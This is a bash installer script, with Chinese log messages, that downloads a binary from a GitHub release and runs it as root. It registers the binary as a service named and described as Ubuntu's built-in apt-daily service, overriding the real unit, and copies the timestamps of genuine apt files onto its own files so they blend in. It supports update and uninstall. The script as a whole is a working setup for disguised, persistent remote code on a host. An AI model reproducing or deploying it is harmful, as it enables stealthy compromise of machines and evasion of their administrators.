#!/bin/bash
set -e

DOWNLOAD_URL="https://github.com/INNERJOINT/apt_daily/releases/latest/download/apt-daily-service"

DST_BINARY="/usr/lib/apt/apt-daily-service"
DST_SERVICE="/etc/systemd/system/apt-daily.service"
DST_INIT="/etc/init.d/apt-daily"

REF_FILE_PRIMARY="/usr/lib/apt/apt.systemd.daily"
REF_FILE_FALLBACK="/usr/bin/apt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        log_error "请以 root 用户运行此脚本"
        exit 1
    fi
}

check_directories() {
    if [ ! -d "/usr/lib/apt" ]; then
        log_error "目录 /usr/lib/apt 不存在"
        exit 3
    fi
}

get_reference_file() {
    if [ -f "$REF_FILE_PRIMARY" ]; then
        echo "$REF_FILE_PRIMARY"
    elif [ -f "$REF_FILE_FALLBACK" ]; then
        echo "$REF_FILE_FALLBACK"
    else
        find /usr/lib/apt -type f -print -quit 2>/dev/null
    fi
}

is_systemd() {
    [ -d /run/systemd/system ]
}

download_binary() {
    log_info "下载 apt-daily-service..."
    
    if command -v curl &>/dev/null; then
        curl -fsSL -o "$DST_BINARY" "$DOWNLOAD_URL"
    elif command -v wget &>/dev/null; then
        wget -q -O "$DST_BINARY" "$DOWNLOAD_URL"
    else
        log_error "需要 curl 或 wget"
        exit 4
    fi
    
    if [ ! -f "$DST_BINARY" ]; then
        log_error "下载失败"
        exit 4
    fi
    
    chmod 755 "$DST_BINARY"
    log_info "可执行文件已安装到 $DST_BINARY"
}


create_service_file() {
    log_info "创建 systemd 服务文件..."
    
    cat > "$DST_SERVICE" << 'EOF'
[Unit]
Description=Daily apt download activities
Documentation=man:apt(8)
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/lib/apt/apt-daily-service
Restart=on-failure
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
    
    chmod 644 "$DST_SERVICE"
    log_info "服务文件已创建: $DST_SERVICE"
}

create_init_script() {
    log_info "创建 init 脚本..."
    
    cat > "$DST_INIT" << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          apt-daily
# Required-Start:    $local_fs $network $remote_fs
# Required-Stop:     $local_fs $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Daily APT download activities
### END INIT INFO

PROG="apt-daily"
EXEC="/usr/lib/apt/apt-daily-service"
PIDFILE="/var/run/apt-daily.pid"

[ -x "$EXEC" ] || exit 5

start() {
    if [ -f "$PIDFILE" ] && ps -p "$(cat "$PIDFILE")" &>/dev/null; then
        echo "$PROG is already running"
        return 1
    fi
    nohup "$EXEC" >/dev/null 2>&1 &
    echo $! > "$PIDFILE"
    echo "$PROG started"
}

stop() {
    [ -f "$PIDFILE" ] || { echo "$PROG is not running"; return 1; }
    kill "$(cat "$PIDFILE")" 2>/dev/null
    rm -f "$PIDFILE"
    echo "$PROG stopped"
}

case "$1" in
    start) start ;;
    stop) stop ;;
    restart) stop; sleep 1; start ;;
    status) [ -f "$PIDFILE" ] && ps -p "$(cat "$PIDFILE")" &>/dev/null && echo "running" || echo "stopped" ;;
    *) echo "Usage: $0 {start|stop|restart|status}"; exit 2 ;;
esac
EOF
    
    chmod 755 "$DST_INIT"
    log_info "init 脚本已创建: $DST_INIT"
}

sync_timestamps() {
    local ref_file
    ref_file=$(get_reference_file)
    
    if [ -z "$ref_file" ] || [ ! -f "$ref_file" ]; then
        log_warn "未找到参考文件，跳过时间戳同步"
        return
    fi
    
    log_info "同步修改时间 (参考: $ref_file)..."
    
    touch -r "$ref_file" "$DST_BINARY"
    touch -r "$ref_file" "$DST_SERVICE"
    touch -r "$ref_file" "$DST_INIT"
    
    log_info "时间戳同步完成"
}

register_service() {
    if is_systemd; then
        log_info "注册 systemd 服务..."
        systemctl daemon-reload
        systemctl enable apt-daily.service 2>/dev/null || true
        systemctl start apt-daily.service 2>/dev/null || log_warn "服务启动失败"
    else
        log_info "注册 SysVinit 服务..."
        update-rc.d apt-daily defaults 2>/dev/null || true
        "$DST_INIT" start 2>/dev/null || log_warn "服务启动失败"
    fi
    log_info "服务注册完成"
}

update_binary() {
    check_root
    log_info "更新 apt-daily-service..."
    
    log_info "停止服务..."
    if is_systemd; then
        systemctl stop apt-daily.service 2>/dev/null || true
    elif [ -x "$DST_INIT" ]; then
        "$DST_INIT" stop 2>/dev/null || true
    fi
    
    local tmp_file="${DST_BINARY}.tmp"
    
    if command -v curl &>/dev/null; then
        curl -fsSL -o "$tmp_file" "$DOWNLOAD_URL"
    elif command -v wget &>/dev/null; then
        wget -q -O "$tmp_file" "$DOWNLOAD_URL"
    else
        log_error "需要 curl 或 wget"
        exit 4
    fi
    
    if [ ! -f "$tmp_file" ]; then
        log_error "下载失败"
        exit 4
    fi
    
    mv "$tmp_file" "$DST_BINARY"
    chmod 755 "$DST_BINARY"
    
    local ref_file
    ref_file=$(get_reference_file)
    if [ -n "$ref_file" ] && [ -f "$ref_file" ]; then
        touch -r "$ref_file" "$DST_BINARY"
    fi
    
    log_info "启动服务..."
    if is_systemd; then
        systemctl start apt-daily.service 2>/dev/null || log_warn "服务启动失败"
    elif [ -x "$DST_INIT" ]; then
        "$DST_INIT" start 2>/dev/null || log_warn "服务启动失败"
    fi
    
    log_info "更新完成!"
}

uninstall() {
    log_info "卸载 apt-daily 服务..."
    
    if is_systemd; then
        systemctl stop apt-daily.service 2>/dev/null || true
        systemctl disable apt-daily.service 2>/dev/null || true
    fi

    if [ -x "$DST_INIT" ]; then
        "$DST_INIT" stop 2>/dev/null || true
        if command -v update-rc.d &>/dev/null; then
            update-rc.d -f apt-daily remove 2>/dev/null || true
        fi
    fi
    
    if pgrep -f "apt-daily-service" >/dev/null 2>&1; then
        log_info "清理残留进程..."
        pkill -f "apt-daily-service" 2>/dev/null || true
    fi
    
    rm -f "$DST_BINARY" "$DST_SERVICE" "$DST_INIT" "/var/run/apt-daily.pid"
    
    if is_systemd; then
        systemctl daemon-reload
    fi
    
    log_info "卸载完成"
}

install() {
    check_root
    check_directories
    download_binary
    create_service_file
    create_init_script
    sync_timestamps
    register_service
    log_info "安装完成!"
}

case "${1:-install}" in
    install|--install) install ;;
    uninstall|--uninstall) check_root; uninstall ;;
    update|--update) update_binary ;;
    *) echo "Usage: $0 [install|uninstall|update]"; exit 2 ;;
esac
